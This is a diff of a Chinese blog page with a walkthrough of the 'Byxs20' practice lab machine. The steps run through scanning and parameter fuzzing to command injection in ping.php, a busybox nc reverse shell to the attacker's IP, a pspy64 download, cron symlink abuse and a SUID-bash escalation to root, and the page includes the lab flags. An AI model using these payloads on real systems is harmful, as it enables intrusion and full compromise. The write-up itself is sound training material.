@@ -18,7 +18,7 @@
 <meta property="og:url" content="https://7r1UMPH.github.io/post/Byxs20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-Up%29.html">
 <meta property="og:image" content="https://7r1umph.top/image/202506121404919.webp">
 <title>Byxs20靶机渗透测试报告 (Write-Up)</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -97,13 +97,15 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <li>
 <p><strong>网络发现 (arp-scan):</strong><br>
 使用 <code class="notranslate">arp-scan</code> 扫描本地网络，发现目标靶机的 IP 地址。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">sudo arp-scan -l</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">sudo arp-scan -l
+</code></pre>
 <p>锁定目标 IP 为 <code class="notranslate">192.168.205.194</code>。</p>
 </li>
 <li>
 <p><strong>端口扫描 (nmap):</strong><br>
 对目标 IP 进行全端口 TCP 扫描，识别开放的服务。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">nmap -p- 192.168.205.194</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">nmap -p- 192.168.205.194
+</code></pre>
 <p>发现开放了两个关键端口：</p>
 <ul>
 <li><code class="notranslate">22/tcp</code>: SSH 服务</li>
@@ -113,7 +115,8 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <li>
 <p><strong>Web 内容发现 (gobuster):</strong><br>
 针对 80 端口的 Web 服务进行目录和文件枚举。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">gobuster dir -u http://192.168.205.194 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,md,html,zip,bak</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">gobuster dir -u http://192.168.205.194 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,md,html,zip,bak
+</code></pre>
 <p>发现以下值得关注的路径和文件：</p>
 <ul>
 <li><code class="notranslate">/index.html</code>: 网站首页。</li>
@@ -144,14 +147,16 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <li>
 <p><strong>发现隐藏参数 (wfuzz):</strong><br>
 使用 <code class="notranslate">wfuzz</code> 对 <code class="notranslate">ping.php</code> 进行参数 Fuzzing，寻找除 <code class="notranslate">ip</code> 之外的其他参数。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">wfuzz -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.194/ping.php?FUZZ=127.0.0.1<span class="pl-pds">"</span></span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 2</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">wfuzz -u "http://192.168.205.194/ping.php?FUZZ=127.0.0.1" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 2
+</code></pre>
 <p>发现了一个名为 <code class="notranslate">debug</code> 的参数。</p>
 </li>
 <li>
 <p><strong>命令注入 (Command Injection):</strong><br>
 <strong>核心发现：</strong> 单独使用 <code class="notranslate">ip</code> 参数只能执行 ping，单独使用 <code class="notranslate">debug</code> 参数（如果有效）也无法直接 RCE。<strong>必须将 <code class="notranslate">ip</code> 和 <code class="notranslate">debug</code> 参数结合起来</strong>，才能触发命令注入漏洞。<br>
 测试命令注入：使用 <code class="notranslate">%0A</code> (URL 编码的换行符) 在 <code class="notranslate">ip</code> 参数中附加 <code class="notranslate">id</code> 命令，并同时加上 <code class="notranslate">debug=1</code> 参数。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">curl <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.194/ping.php?ip=127.0.0.1%0Aid&amp;debug=1<span class="pl-pds">"</span></span></pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">curl "http://192.168.205.194/ping.php?ip=127.0.0.1%0Aid&amp;debug=1"
+</code></pre>
 <p>返回的输出包含了 <code class="notranslate">[*] Debug Mode Activated</code>、<code class="notranslate">[+] Raw Command: ping -c 3 127.0.0.1\nid</code> 以及 <code class="notranslate">id</code> 命令的执行结果 (<code class="notranslate">uid=33(www-data)...</code>)，确认了命令注入！</p>
 </li>
 <li>
@@ -160,13 +165,15 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <ol>
 <li>
 <p>在攻击机上设置 Netcat 监听：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">nc -lvnp 8888</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">nc -lvnp 8888
+</code></pre>
 </li>
 <li>
 <p>构造并发送反弹 Shell 的 payload。使用 <code class="notranslate">busybox nc</code> 提高兼容性，并对 payload 进行 URL 编码。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> Payload: busybox nc [你的攻击机IP] 8888 -e /bin/bash</span>
-<span class="pl-c"><span class="pl-c">#</span> URL 编码后: busybox%20nc%20[你的攻击机IP]%208888%20-e%20%2Fbin%2Fbash</span>
-curl <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.194/ping.php?ip=127.0.0.1%0Abusybox%20nc%20[你的攻击机IP]%208888%20-e%20%2Fbin%2Fbash&amp;debug=1<span class="pl-pds">"</span></span></pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate"># Payload: busybox nc [你的攻击机IP] 8888 -e /bin/bash
+# URL 编码后: busybox%20nc%20[你的攻击机IP]%208888%20-e%20%2Fbin%2Fbash
+curl "http://192.168.205.194/ping.php?ip=127.0.0.1%0Abusybox%20nc%20[你的攻击机IP]%208888%20-e%20%2Fbin%2Fbash&amp;debug=1"
+</code></pre>
 <p>将 <code class="notranslate">[你的攻击机IP]</code> 替换为你的 IP。执行后，<code class="notranslate">nc</code> 监听端应收到连接。</p>
 </li>
 </ol>
@@ -174,17 +181,18 @@ curl <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.194/ping
 <li>
 <p><strong>升级 Shell:</strong><br>
 为了更好的交互体验，将获取到的基础 Shell 升级为标准的 TTY。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在反弹 Shell 中</span>
+<pre lang="bash" class="notranslate"><code class="notranslate"># 在反弹 Shell 中
 script /dev/null -c bash
-<span class="pl-c"><span class="pl-c">#</span> 按 Ctrl+Z</span>
-<span class="pl-c"><span class="pl-c">#</span> 在攻击机终端</span>
-stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>
-<span class="pl-c"><span class="pl-c">#</span> 按两次 Enter</span>
-<span class="pl-c"><span class="pl-c">#</span> 回到反弹 Shell</span>
+# 按 Ctrl+Z
+# 在攻击机终端
+stty raw -echo; fg
+# 按两次 Enter
+# 回到反弹 Shell
 reset xterm
-<span class="pl-k">export</span> TERM=xterm
-<span class="pl-k">export</span> SHELL=/bin/bash
-stty rows 40 columns 178 <span class="pl-c"><span class="pl-c">#</span> 根据实际终端调整</span></pre></div>
+export TERM=xterm
+export SHELL=/bin/bash
+stty rows 40 columns 178 # 根据实际终端调整
+</code></pre>
 <p>现在你拥有了一个稳定的 <code class="notranslate">www-data</code> 权限 Shell。</p>
 </li>
 </ul>
@@ -199,11 +207,12 @@ stty rows 40 columns 178 <span class="pl-c"><span class="pl-c">#</span> 根据�
 </li>
 <li>
 <p>在目标机 <code class="notranslate">/tmp</code> 目录下下载并运行 <code class="notranslate">pspy64</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在目标机 www-data Shell 中</span>
-<span class="pl-c1">cd</span> /tmp
+<pre lang="bash" class="notranslate"><code class="notranslate"># 在目标机 www-data Shell 中
+cd /tmp
 busybox wget http://[你的攻击机IP]/pspy64
 chmod +x pspy64
-./pspy64</pre></div>
+./pspy64
+</code></pre>
 <p><code class="notranslate">pspy64</code> 的输出揭示了一个以 root 权限 (<code class="notranslate">UID=0</code>) 定期执行的 Cron 任务：</p>
 </li>
 </ol>
@@ -217,30 +226,34 @@ chmod +x pspy64
 <ol>
 <li>
 <p><strong>读取 user flag:</strong> 将 <code class="notranslate">apache2.conf.bak</code> 链接到 <code class="notranslate">user.txt</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">cd</span> /var/www/html/conf
-ln -sf /home/welcome/user.txt apache2.conf.bak</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">cd /var/www/html/conf
+ln -sf /home/welcome/user.txt apache2.conf.bak
+</code></pre>
 </li>
 <li>
 <p>等待 Cron 任务执行（最多 1 分钟）。</p>
 </li>
 <li>
 <p>读取被覆盖后的 Apache 配置文件，即得到 <code class="notranslate">user.txt</code> 的内容。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">cat /etc/apache2/apache2.conf
-<span class="pl-c"><span class="pl-c">#</span> -&gt; flag{user-05659dca555d4ddbc396b319645f3d2a}</span></pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">cat /etc/apache2/apache2.conf
+# -&gt; flag{user-05659dca555d4ddbc396b319645f3d2a}
+</code></pre>
 </li>
 <li>
 <p><strong>读取 root flag:</strong> 删除旧链接，创建新链接指向 <code class="notranslate">root.txt</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">rm apache2.conf.bak
+<pre lang="bash" class="notranslate"><code class="notranslate">rm apache2.conf.bak
 touch apache2.conf.bak
-ln -sf /root/root.txt apache2.conf.bak</pre></div>
+ln -sf /root/root.txt apache2.conf.bak
+</code></pre>
 </li>
 <li>
 <p>再次等待 Cron 任务执行。</p>
 </li>
 <li>
 <p>读取 Apache 配置文件得到 <code class="notranslate">root.txt</code> 的内容。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">cat /etc/apache2/apache2.conf
-<span class="pl-c"><span class="pl-c">#</span> -&gt; flag{root-f9ef88715e3bbec612f9f88d64ae3a99}</span></pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">cat /etc/apache2/apache2.conf
+# -&gt; flag{root-f9ef88715e3bbec612f9f88d64ae3a99}
+</code></pre>
 </li>
 </ol>
 </li>
@@ -250,23 +263,26 @@ ln -sf /root/root.txt apache2.conf.bak</pre></div>
 <ol>
 <li>
 <p><strong>修改 Apache 配置:</strong> 利用 Cron 任务，修改 Apache 的运行用户为 <code class="notranslate">welcome</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">cd</span> /var/www/html/conf
+<pre lang="bash" class="notranslate"><code class="notranslate">cd /var/www/html/conf
 nano apache2.conf.bak
 User welcome
-Group welcome</pre></div>
+Group welcome
+</code></pre>
 </li>
 <li>
 <p>等待 Cron 执行，并让 Apache 服务以新用户身份运行（可以直接<code class="notranslate">sudo /usr/sbin/reboot</code>）。</p>
 </li>
 <li>
 <p><strong>获取 <code class="notranslate">welcome</code> Shell:</strong> 再次使用之前的命令注入获取反弹 Shell。连接后确认用户身份。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> ... 获取反弹 Shell ...</span>
+<pre lang="bash" class="notranslate"><code class="notranslate"># ... 获取反弹 Shell ...
 id
-<span class="pl-c"><span class="pl-c">#</span> 应显示 uid=1000(welcome) ...</span></pre></div>
+# 应显示 uid=1000(welcome) ...
+</code></pre>
 </li>
 <li>
 <p><strong>检查 Sudo 权限:</strong> 作为 <code class="notranslate">welcome</code> 用户，查看其 <code class="notranslate">sudo</code> 权限。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">sudo -l</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">sudo -l
+</code></pre>
 <p>发现 <code class="notranslate">welcome</code> 可以无密码执行 <code class="notranslate">/home/welcome/test/test</code>。</p>
 </li>
 <li>
@@ -274,21 +290,24 @@ id
 </li>
 <li>
 <p>创建脚本，赋予 <code class="notranslate">/bin/bash</code> SUID 权限。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">mv /home/welcome/test /home/welcome/test1
+<pre lang="bash" class="notranslate"><code class="notranslate">mv /home/welcome/test /home/welcome/test1
 mkdir /home/welcome/test
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>#!/bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /home/welcome/test/test
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>chmod u+s /bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;&gt;</span> /home/welcome/test/test
-chmod +x /home/welcome/test/test</pre></div>
+echo '#!/bin/bash' &gt; /home/welcome/test/test
+echo 'chmod u+s /bin/bash' &gt;&gt; /home/welcome/test/test
+chmod +x /home/welcome/test/test
+</code></pre>
 </li>
 <li>
 <p>通过 <code class="notranslate">sudo</code> 执行该脚本。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">sudo /home/welcome/test/test</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">sudo /home/welcome/test/test
+</code></pre>
 </li>
 <li>
 <p><strong>获取 Root:</strong> 执行带有 SUID 权限的 <code class="notranslate">bash</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">bash -p
+<pre lang="bash" class="notranslate"><code class="notranslate">bash -p
 id
-<span class="pl-c"><span class="pl-c">#</span> 应显示 euid=0(root)</span></pre></div>
+# 应显示 euid=0(root)
+</code></pre>
 <p>成功获取 root 权限。</p>
 </li>
 </ol>
